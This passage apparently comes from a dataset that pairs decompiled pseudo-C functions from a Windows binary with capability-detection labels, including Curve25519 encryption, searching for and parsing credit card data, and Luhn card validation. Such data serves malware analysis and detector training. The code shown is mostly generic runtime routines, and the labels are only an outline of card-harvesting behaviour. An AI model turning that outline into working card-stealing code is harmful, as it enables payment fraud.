code_r0x0040cd8b;\n            if (cVar8 == 'i') goto code_r0x0040cd7d;\n            if (cVar8 == 'n') {\n                cVar8 = fcn.0040d313();\n            }\n            else {\n                if (cVar8 != 'o') goto code_r0x0040d038;\n                cVar8 = fcn.0040d397();\n            }\n        }\n    }\n    else {\n        if (cVar8 != 's') {\n            if (cVar8 != 'u') {\n                if (cVar8 != 'x') goto code_r0x0040d038;\n                arg_8h = 0;\n                goto code_r0x0040cd24;\n            }\n            goto code_r0x0040cd81;\n        }\ncode_r0x0040cd0c:\n        cVar8 = fcn.0040d3ca();\n    }\n    if ((cVar8 != '\\0') && (*(param_1 + 0xb) == '\\0')) {\n        iVar12 = 0;\n        iStack28 = 0;\n        if ((param_1[7] >> 4 & 1) != 0) {\n            if (((param_1[7] >> 6 & 1) == 0) && ((*(param_1 + 7) & 1) == 0)) {\n                if ((param_1[7] >> 1 & 1) != 0) {\n                    iVar12 = 1;\n                    iStack28 = 1;\n                }\n            }\n            else {\n                iStack28 = 1;\n                iVar12 = 1;\n            }\n        }\n        cVar8 = *(param_1 + 0x2d);\n        if (((cVar8 != 'x') && (cVar8 != 'X')) || (bVar6 = true,  (param_1[7] >> 5 & 1) == 0)) {\n            bVar6 = false;\n        }\n        if ((cVar8 == 'a') || (bVar7 = false,  cVar8 == 'A')) {\n            bVar7 = true;\n        }\n        if ((bVar6) || (bVar7)) {\n            (&stack0xffffffec)[iVar12] = 0x30;\n            if ((cVar8 == 'X') || (cVar8 == 'A')) {\n                uVar9 = 0x58;\n            }\n            else {\n                uVar9 = 0x78;\n            }\n            (&stack0xffffffed)[iVar12] = uVar9;\n            iVar12 = iVar12 + 2;\n            iStack28 = iVar12;\n        }\n        iVar15 = (param_1[8] - param_1[0xd]) - iVar12;\n        if (((*(param_1 + 7) & 0xc) == 0) && (0 < iVar15)) {\n            uVar11 = param_1[5];\n            iVar13 = 0;\n            do {\n                uVar4 = param_1[0x112];\n                if (*(param_1[0x112] + 8) == *(uVar4 + 4)) {\n                    if (*(uVar4 + 0xc) == '\\0') {\n                        uVar11 = 0xffffffff;\n                    }\n                    else {\n                        uVar11 = uVar11 + 1;\n                    }\n                    param_1[5] = uVar11;\n                }\n                else {\n                    param_1[5] = uVar11 + 1;\n                    *(uVar4 + 8) = *(uVar4 + 8) + 1;\n                    **param_1[0x112] = 0x20;\n                    *param_1[0x112] = *param_1[0x112] + 1;\n                    uVar11 = param_1[5];\n                }\n                iVar12 = iStack28;\n            } while ((uVar11 != 0xffffffff) && (iVar13 = iVar13 + 1,  iVar13 < iVar15));\n        }\n        arg_10h = param_1 + 5;\n        ppiVar1 = param_1 + 0x112;\n        fcn.0040d547(&stack0xffffffec, iVar12, arg_10h);\n        if (((param_1[7] >> 3 & 1) != 0) && (((param_1[7] >> 2 & 1) == 0 && (iVar12 = 0,  0 < iVar15)))) {\n            uVar11 = *arg_10h;\n            do {\n                piVar5 = *ppiVar1;\n                if (piVar5[2] == piVar5[1]) {\n                    if (*(piVar5 + 3) == '\\0') {\n                        uVar11 = 0xffffffff;\n                    }\n                    else {\n                        uVar11 = uVar11 + 1;\n                    }\n                    *arg_10h = uVar11;\n                }\n                else {\n                    *arg_10h = uVar11 + 1;\n                    piVar5[2] = piVar5[2] + 1;\n                    ***ppiVar1 = 0x30;\n                    **ppiVar1 = **ppiVar1 + 1;\n                    uVar11 = *arg_10h;\n                }\n            } while ((uVar11 != 0xffffffff) && (iVar12 = iVar12 + 1,  iVar12 < iVar15));\n        }\n        iVar12 = 0;\n        if ((*(param_1 + 0xe) == '\\0') || (param_1[0xd] < 1)) {\n            fcn.0040d547(param_1[0xc], param_1[0xd], arg_10h);\n        }\n        else {\n            puVar14 = param_1[0xc];\n            uVar11 = 0;\n            do {\n                uVar2 = *puVar14;\n                puVar14 = puVar14 + 1;\n                arg_ch = 0;\n                iVar13 = fcn.004151aa(&stack0xffffffe8, &stack0xfffffff0, 6, uVar2, param_1[2]);\n                if ((iVar13 != 0) || (arg_ch == 0)) {\n                    *arg_10h = 0xffffffff;\n                    break;\n                }\n                fcn.0040d547(&stack0xfffffff0, arg_ch, arg_10h);\n                uVar11 = uVar11 + 1;\n            } while (uVar11 != param_1[0xd]);\n        }\n        uVar11 = *arg_10h;\n        if (((-1 < uVar11) && ((param_1[7] >> 2 & 1) != 0)) && (0 < iVar15)) {\n            do {\n                piVar5 = *ppiVar1;\n                if (piVar5[2] == piVar5[1]) {\n                    if (*(piVar5 + 3) == '\\0') {\n                        uVar11 = 0xffffffff;\n                    }\n                    else {\n                        uVar11 = uVar11 + 1;\n                    }\n                    *arg_10h = uVar11;\n                }\n                else {\n                    *arg_10h = uVar11 + 1;\n                    piVar5[2] = piVar5[2] + 1;\n                    ***ppiVar1 = 0x20;\n                    **ppiVar1 = **ppiVar1 + 1;\n                    uVar11 = *arg_10h;\n                }\n            } while ((uVar11 != 0xffffffff) && (iVar12 = iVar12 + 1,  iVar12 < iVar15));\n        }\n    }\ncode_r0x0040d038:\n    uVar11 = fcn.00406dcc(unaff_EBX);\n    return uVar11;\n}\n",
        "token_count": 3248
    },
    "00419061": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00419061(uint32_t arg_8h, uint liDistanceToMove, uint lpNewFilePointer, uint arg_14h, int32_t arg_18h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint32_t dwMoveMethod;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0041c451(arg_8h);\n    if (iVar2 == -1) {\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 9;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)\n                          (iVar2, liDistanceToMove, lpNewFilePointer, &dwMoveMethod, arg_14h);\n        if (iVar2 == 0) {\n            arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.0040e0b7(arg_8h_00, arg_18h);\n        }\n        else if ((dwMoveMethod & var_4h) != 0xffffffff) {\n            puVar1 = *((arg_8h >> 6) * 4 + 0x48fb00) + 0x28 + (arg_8h & 0x3f) * 0x38;\n            *puVar1 = *puVar1 & 0xfd;\n            goto code_r0x004190e0;\n        }\n    }\n    dwMoveMethod = 0xffffffff;\n    var_4h = 0xffffffff;\ncode_r0x004190e0:\n    return CONCAT44(var_4h, dwMoveMethod);\n}\n",
        "token_count": 387
    },
    "0041c37a": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c37a(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x48fb00));\n    return;\n}\n",
        "token_count": 70
    },
    "0041c39d": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c39d(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x38 + *((lpCriticalSection >> 6) * 4 + 0x48fb00));\n    return;\n}\n",
        "token_count": 71
    },
    "00420484": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420484(uint8_t *arg_8h, uint32_t arg_ch, uint32_t *arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if (arg_8h == NULL) {\n        arg_ch = 0;\n    }\n    else {\n        if (arg_ch != 0) {\n            if ((arg_ch & 0xffffff80) == 0) {\n                *arg_8h = arg_ch;\n                return 1;\n            }\n            if ((arg_ch & 0xfffff800) == 0) {\n                uVar3 = 0xc0;\n                iVar4 = 1;\n                iVar5 = iVar4;\n            }\n            else if ((arg_ch & 0xffff0000) == 0) {\n                if ((0xd7ff < arg_ch) && (arg_ch < 0xe000)) {\ncode_r0x00420523:\n                    uVar2 = fcn.00422111(arg_10h, arg_14h);\n                    return uVar2;\n                }\n                iVar4 = 2;\n                uVar3 = 0xe0;\n                iVar5 = iVar4;\n            }\n            else {\n                if (((arg_ch & 0xffe00000) != 0) || (0x10ffff < arg_ch)) goto code_r0x00420523;\n                iVar4 = 3;\n                uVar3 = 0xf0;\n                iVar5 = iVar4;\n            }\n            do {\n                uVar1 = arg_ch;\n                arg_ch = arg_ch >> 6;\n                arg_8h[iVar4] = uVar1 & 0x3f | 0x80;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n            *arg_8h = arg_ch | uVar3;\n            uVar2 = fcn.004220fd(iVar5 + 1, arg_10h);\n            return uVar2;\n        }\n        *arg_8h = arg_ch;\n    }\n    *arg_10h = arg_ch;\n    arg_10h[1] = arg_ch;\n    return 1;\n}\n",
        "token_count": 505
    },
    "00410a74": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00410a74(char *arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    iVar6 = 0;\n    cVar2 = *arg_8h;\n    pcVar5 = arg_8h;\n    while (cVar2 != '\\0') {\n        if (cVar2 != '=') {\n            iVar6 = iVar6 + 1;\n        }\n        do {\n            cVar2 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar2 != '\\0');\n        cVar2 = *pcVar5;\n    }\n    piVar3 = fcn.004144bf(iVar6 + 1, 4);\n    var_4h = piVar3;\n    if (piVar3 == NULL) {\n        fcn.0041451c(0);\n        piVar3 = NULL;\n    }\n    else {\n        for (; *arg_8h != '\\0'; arg_8h = arg_8h + pcVar5) {\n            pcVar5 = arg_8h;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            pcVar5 = pcVar5 + (1 - (arg_8h + 1));\n            if (*arg_8h != '=') {\n                iVar6 = fcn.004144bf(pcVar5, 1);\n                if (iVar6 == 0) {\n                    fcn.00410b56(piVar3);\n                    fcn.0041451c(0);\n                    fcn.0041451c(0);\n                    return NULL;\n                }\n                iVar4 = fcn.00412d4a(iVar6, pcVar5, arg_8h);\n                if (iVar4 != 0) {\n                    fcn.0040b84c(0, 0, 0, 0, 0);\n                    pcVar1 = swi(3);\n                    piVar3 = (*pcVar1)();\n                    return piVar3;\n                }\n                *var_4h = iVar6;\n                var_4h = var_4h + 1;\n                fcn.0041451c(0);\n            }\n        }\n        fcn.0041451c(0);\n    }\n    return piVar3;\n}\n",
        "token_count": 574
    },
    "004069af": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.004069af(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4235f4;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x48e22c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    while (*0x48e224 < 10) {\n        iVar1 = *0x48e224 * 4;\n        *0x48e224 = *0x48e224 + 1;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*(iVar1 + 0x48f328), uVar2);\n        if (pcVar3 != NULL) {\n            (**0x424130)();\n            (*pcVar3)();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 239
    },
    "00401300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401300(uint32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    if (param_1 + 0x23 <= param_1) {\n        fcn.00401b90();\n        fcn.00407c30(&stack0xfffffff4, 0x430680);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar2 = fcn.00406d89(param_1 + 0x23, unaff_retaddr);\n    if (iVar2 != 0) {\n        *((iVar2 + 0x23U & 0xffffffe0) - 4) = iVar2;\n        return;\n    }\n    fcn.0040b76b(0, 0, 0, 0, 0);\n    fcn.0040b84c(0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 233
    },
    "0040b82f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b82f(void)\n\n{\n    code *pcVar1;\n    \n    fcn.0040b76b(0, 0, 0, 0, 0);\n    fcn.0040b84c(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 89
    },
    "00401330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401330(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EBP;\n    \n    if (0x7fffffff < param_3) {\n        fcn.00403320();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    param_1[5] = 0xf;\n    if (param_3 < 0x10) {\n        param_1[4] = param_3;\n        fcn.00408060(param_1, param_2, param_3);\n        return;\n    }\n    uVar3 = param_3 | 0xf;\n    if (uVar3 < 0x80000000) {\n        if (uVar3 < 0x16) {\n            uVar3 = 0x16;\n        }\n    }\n    else {\n        uVar3 = 0x7fffffff;\n    }\n    iVar2 = fcn.00403340(uVar3 + 1);\n    param_1[4] = param_3;\n    *param_1 = iVar2;\n    param_1[5] = uVar3;\n    fcn.00408060(iVar2, unaff_EBP, param_3);\n    *(param_3 + iVar2) = 0;\n    return;\n}\n",
        "token_count": 323
    },
    "004013c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004013c0(int32_t *param_1)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint32_t unaff_retaddr;\n    uint32_t uVar4;\n    int32_t *piStack8;\n    int32_t *piStack4;\n    \n    piStack4 = *(*(*(*param_1 + 4) + 0x30 + param_1) + 4);\n    (**(*piStack4 + 4))();\n    piVar2 = fcn.00401430(&piStack8);\n    uVar1 = (**(*piVar2 + 0x20))(10);\n    uVar4 = unaff_retaddr & 0xffffff00 | uVar1;\n    if (piStack8 != NULL) {\n        puVar3 = (**(*piStack8 + 8))();\n        if (puVar3 != NULL) {\n            (***puVar3)(1);\n        }\n    }\n    fcn.004048b0(uVar4);\n    fcn.00404300();\n    return param_1;\n}\n",
        "token_count": 249
    },
    "004017b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar (*) [16] __thiscall fcn.004017b0(uchar (*param_1) [16], uint32_t param_2, char param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar (*pauVar3) [16];\n    uint32_t uVar4;\n    \n    *param_1 = ZEXT816(0);\n    *param_1[1] = 0;\n    *(param_1[1] + 4) = 0;\n    if (0x7fffffff < param_2) {\n        fcn.00403320();\n        pcVar1 = swi(3);\n        pauVar3 = (*pcVar1)();\n        return pauVar3;\n    }\n    *(param_1[1] + 4) = 0xf;\n    if (param_2 < 0x10) {\n        *param_1[1] = param_2;\n        fcn.004085e0(param_1, param_3, param_2);\n        return param_1;\n    }\n    uVar4 = param_2 | 0xf;\n    if (uVar4 < 0x80000000) {\n        if (uVar4 < 0x16) {\n            uVar4 = 0x16;\n        }\n    }\n    else {\n        uVar4 = 0x7fffffff;\n    }\n    iVar2 = fcn.00403340(uVar4 + 1);\n    **param_1 = iVar2;\n    *param_1[1] = param_2;\n    *(param_1[1] + 4) = uVar4;\n    fcn.004085e0(iVar2, param_2, param_2);\n    *(iVar2 + param_2) = 0;\n    return param_1;\n}\n",
        "token_count": 400
    },
    "00401890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401890(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_retaddr;\n    \n    fcn.00404b8c(0);\n    *(param_1 + 4) = 0;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x24) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x2c) = 0;\n    *(param_1 + 0x30) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    if (unaff_retaddr != 0) {\n        fcn.00405073(param_1, unaff_retaddr);\n        return param_1;\n    }\n    fcn.00404d88(\"bad locale name\");\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 307
    },
    "00401be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00401be0(code **param_1, int32_t param_2)\n\n{\n    *param_1 = vtable.std::exception.0;\n    *(param_1 + 1) = 0;\n    fcn.00407bae(param_2 + 4, param_1 + 1);\n    return param_1;\n}\n",
        "token_count": 83
    },
    "00402920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.00402920(uint param_1, uchar *param_2, char param_3, uint32_t param_4)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    uint32_t uVar3;\n    \n    *param_2 = 0x25;\n    puVar1 = param_2 + 1;\n    if ((param_4 & 0x20) != 0) {\n        *puVar1 = 0x2b;\n        puVar1 = param_2 + 2;\n    }\n    if ((param_4 & 0x10) != 0) {\n        *puVar1 = 0x23;\n        puVar1 = puVar1 + 1;\n    }\n    *puVar1 = 0x2a2e;\n    puVar2 = puVar1 + 1;\n    if (param_3 != '\\0') {\n        *puVar2 = param_3;\n        puVar2 = puVar1 + 3;\n    }\n    uVar3 = param_4 & 0x3000;\n    if ((param_4 & 4) == 0) {\n        if (uVar3 != 0x2000) {\n            if (uVar3 == 0x3000) {\n                *puVar2 = 0x61;\n                *(puVar2 + 1) = 0;\n                return param_2;\n            }\n            *puVar2 = (uVar3 != 0x1000) * '\\x02' + 'e';\n            *(puVar2 + 1) = 0;\n            return param_2;\n        }\n    }\n    else if (uVar3 != 0x2000) {\n        if (uVar3 == 0x3000) {\n            *puVar2 = 0x41;\n            *(puVar2 + 1) = 0;\n            return param_2;\n        }\n        *puVar2 = (uVar3 != 0x1000) * '\\x02' + 'E';\n        *(puVar2 + 1) = 0;\n        return param_2;\n    }\n    *puVar2 = 0x66;\n    *(puVar2 + 1) = 0;\n    return param_2;\n}\n",
        "token_count": 503
    },
    "00403340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00403340(uint32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_retaddr;\n    \n    if (param_1 < 0x1000) {\n        if (param_1 != 0) {\n            uVar3 = fcn.00406d89(param_1, unaff_retaddr);\n            return uVar3;\n        }\n        return 0;\n    }\n    if (param_1 < param_1 + 0x23) {\n        iVar2 = fcn.00406d89(param_1 + 0x23, unaff_retaddr);\n        if (iVar2 != 0) {\n            uVar3 = iVar2 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar2;\n            return uVar3;\n        }\n    }\n    else {\n        fcn.00403300();\n    }\n    fcn.0040b82f();\n    pcVar1 = swi(3);\n    uVar3 = (*pcVar1)();\n    return uVar3;\n}\n",
        "token_count": 254
    },
    "00404b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00404b30(uint param_1, uint param_2, uint param_3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_1ch;\n    uchar *arg_20h;\n    \n    arg_20h = &stack0x00000010;\n    arg_1ch = 0;\n    puVar1 = fcn.00404ad0();\n    iVar2 = fcn.0040d5d0(*puVar1, puVar1[1], param_1, param_2, param_3, arg_1ch, arg_20h);\n    if (iVar2 < 0) {\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 164
    },
    "00405640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405640(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004072c2(8);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0;\n    if (*(unaff_EBP + 0x10) != 0) {\n        *extraout_ECX = 0x42517c;\n        extraout_ECX[4] = 0;\n        extraout_ECX[0xc] = 0;\n        extraout_ECX[0xd] = 0;\n        extraout_ECX[0xe] = 0;\n        extraout_ECX[2] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x10) = 1;\n    }\n    arg_ch_00 = *(unaff_EBP + 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(extraout_ECX + *(*extraout_ECX + 4)) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *(*(*extraout_ECX + 4) + -4 + extraout_ECX) = *(*extraout_ECX + 4) + -8;\n    fcn.00405f2c(arg_8h_00, arg_ch_00);\n    fcn.0040729f();\n    return;\n}\n",
        "token_count": 422
    },
    "00405b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b5c(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *in_ECX;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    uVar1 = in_ECX[4] - arg_8h;\n    if (arg_ch <= uVar1) {\n        uVar1 = arg_ch;\n    }\n    puVar2 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        puVar2 = *in_ECX;\n    }\n    iVar3 = in_ECX[4] - uVar1;\n    fcn.00408060(puVar2 + arg_8h, uVar1 + puVar2 + arg_8h, (iVar3 - arg_8h) + 1);\n    in_ECX[4] = iVar3;\n    return;\n}\n",
        "token_count": 202
    },
    "00405dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405dd0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *(param_1 + 0xc);\n    iVar1 = param_1 + 0x3c;\n    if (*piVar2 != iVar1) {\n        *(param_1 + 0x50) = *piVar2;\n        *(param_1 + 0x54) = **(param_1 + 0x1c) + **(param_1 + 0x2c);\n        piVar2 = *(param_1 + 0xc);\n    }\n    *piVar2 = iVar1;\n    **(param_1 + 0x1c) = iVar1;\n    **(param_1 + 0x2c) = 1;\n    return;\n}\n",
        "token_count": 192
    },
    "00408910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408910(uint32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar3 = *arg_8h;\n        uVar1 = *arg_ch;\n    }\n    else if (arg_10h == 2) {\n        iVar2 = *arg_8h - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n    }\n    else if (arg_10h == 3) {\n        iVar2 = *arg_8h - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n    }\n    else {\n        if (arg_10h != 4) {\ncode_r0x00408df3:\n    // switch table (32 cases) at 0x409f0c\n            switch(arg_10h) {\n            case 0:\n                break;\n            case 1:\n                goto code_r0x004095f8;\n            case 2:\n                goto code_r0x00409a21;\n            case 3:\n                goto code_r0x004095b4;\n            case 4:\n                goto code_r0x00409178;\n            case 5:\n                goto code_r0x00409564;\n            case 6:\n                goto code_r0x0040998e;\n            case 7:\n                goto code_r0x00409da7;\n            case 8:\n                goto code_r0x004090e5;\n            case 9:\n                goto code_r0x004094d1;\n            case 10:\n                goto code_r0x004098fa;\n            case 0xb:\n                goto code_r0x00409d14;\n            case 0xc:\n                goto code_r0x00409052;\n            case 0xd:\n                goto code_r0x0040943e;\n            case 0xe:\n                goto code_r0x00409867;\n            case 0xf:\n                goto code_r0x00409c81;\n            case 0x10:\n                goto code_r0x00408fbf;\n            case 0x11:\n                goto code_r0x004093ab;\n            case 0x12:\n                goto code_r0x004097d4;\n            case 0x13:\n                goto code_r0x00409bed;\n            case 0x14:\n                goto code_r0x00408f2c;\n            case 0x15:\n                goto code_r0x00409318;\n            case 0x16:\n                goto code_r0x00409741;\n            case 0x17:\n                goto code_r0x00409b5a;\n            case 0x1a:\n                goto code_r0x004096ae;\n            case 0x1b:\n                goto code_r0x00409ac7;\n            case 0x1c:\n                uVar1 = *(arg_8h + arg_10h + -0x1c);\n                if (uVar1 != *(arg_ch + arg_10h + -0x1c)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1c);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\n            case 0x18:\n                uVar1 = *(arg_8h + arg_10h + -0x18);\n                if (uVar1 != *(arg_ch + arg_10h + -0x18)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x18);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00408f2c:\n                uVar1 = *(arg_8h + arg_10h + -0x14);\n                if (uVar1 != *(arg_ch + arg_10h + -0x14)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar2 != 0) 